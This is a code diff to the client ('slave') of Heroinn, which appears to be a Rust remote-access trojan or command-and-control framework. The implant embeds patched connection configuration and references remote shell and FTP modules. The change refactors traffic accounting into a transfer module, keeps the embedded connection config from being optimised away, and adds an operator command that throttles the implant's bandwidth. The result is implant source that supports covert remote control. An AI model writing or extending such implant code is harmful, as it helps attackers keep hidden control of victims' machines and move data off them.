@@ -7,10 +7,9 @@ use heroinn_util::{
     protocol::Transport,
     session::{ClientSession, SessionBase, SessionManager},
 };
-use std::sync::atomic::Ordering::Relaxed;
 use std::{
     str::FromStr,
-    sync::{Arc, LazyLock, Mutex, atomic::AtomicU64, mpsc::channel},
+    sync::{Arc, Mutex, mpsc::channel},
     time::Duration,
 };
 use systemstat::{Ipv4Addr, Platform, System};
@@ -19,20 +18,18 @@ use uuid::Uuid;
 mod config;
 mod module;
 
-use module::shell::ShellClient;
+use module::{shell::ShellClient, transfer};
 
 use crate::{config::master_configure, module::ftp::FtpClient};
 
-const G_CONNECTION_INFO: SlaveDNA = SlaveDNA {
+#[used]
+static G_CONNECTION_INFO: SlaveDNA = SlaveDNA {
     flag: CONNECTION_INFO_FLAG,
     size: [0u8; 8],
     data: [0u8; 1024],
 };
 
-static G_OUT_BYTES: LazyLock<Arc<AtomicU64>> = LazyLock::new(|| Arc::new(AtomicU64::new(0)));
-static G_IN_BYTES: LazyLock<Arc<AtomicU64>> = LazyLock::new(|| Arc::new(AtomicU64::new(0)));
-// Kept behind a static so the compiler cannot inline G_CONNECTION_INFO into the code.
-static G_DNA: LazyLock<SlaveDNA> = LazyLock::new(|| G_CONNECTION_INFO);
+static G_DNA: &SlaveDNA = &G_CONNECTION_INFO;
 
 fn main() {
     #[cfg(debug_assertions)]
@@ -145,7 +142,7 @@ fn main() {
             }
         };
 
-        if let Err(e) = client.send(&buf) {
+        if let Err(e) = transfer::send(&mut client, &buf) {
             log::error!("send HostInfo packet failed : {}", e);
             client.close();
             continue;
@@ -163,9 +160,7 @@ fn main() {
                 }
             };
 
-            G_OUT_BYTES.fetch_add(buf.len() as u64, Relaxed);
-
-            if let Err(e) = client_1.send(&buf) {
+            if let Err(e) = transfer::send(&mut client_1, &buf) {
                 log::info!("sender channel closed : {}", e);
                 client_1.close();
                 break;
@@ -179,11 +174,7 @@ fn main() {
         std::thread::spawn(move || {
             loop {
                 // Flush the in/out transfer rates accumulated since the last beat.
-                let in_rate = G_IN_BYTES.load(Relaxed);
-                let out_rate = G_OUT_BYTES.load(Relaxed);
-
-                G_IN_BYTES.store(0, Relaxed);
-                G_OUT_BYTES.store(0, Relaxed);
+                let (in_rate, out_rate) = transfer::take_rates();
 
                 let heartbeat = Heartbeat {
                     time: cur_timestamp_secs(),
@@ -237,7 +228,7 @@ fn main() {
         });
 
         loop {
-            let buf = match client.recv() {
+            let buf = match transfer::recv(&mut client) {
                 Ok(buf) => buf,
                 Err(e) => {
                     log::error!("connection recv failed : {}", e);
@@ -245,8 +236,6 @@ fn main() {
                     break;
                 }
             };
-
-            G_IN_BYTES.fetch_add(buf.len() as u64, Relaxed);
             log::info!("recv [{}] bytes", buf.len());
 
             let command = buf
@@ -300,6 +289,24 @@ fn main() {
                         .unwrap()
                         .write(&packet.id, &packet.data)
                         .unwrap();
+                }
+                Some(HeroinnServerCommandID::SetTransferRate) => {
+                    let setting = match msg.parse_transfer_rate() {
+                        Ok(p) => p,
+                        Err(e) => {
+                            log::error!("decode transfer rate setting failed : {}", e);
+                            continue;
+                        }
+                    };
+
+                    match transfer::set_rate(setting.bytes_per_sec) {
+                        Ok(_) => log::info!(
+                            "aggregate transfer rate limited to {} bytes/s (effective {})",
+                            setting.bytes_per_sec,
+                            transfer::current_rate()
+                        ),
+                        Err(e) => log::error!("apply transfer rate setting failed : {}", e),
+                    }
                 }
                 None => {}
             }
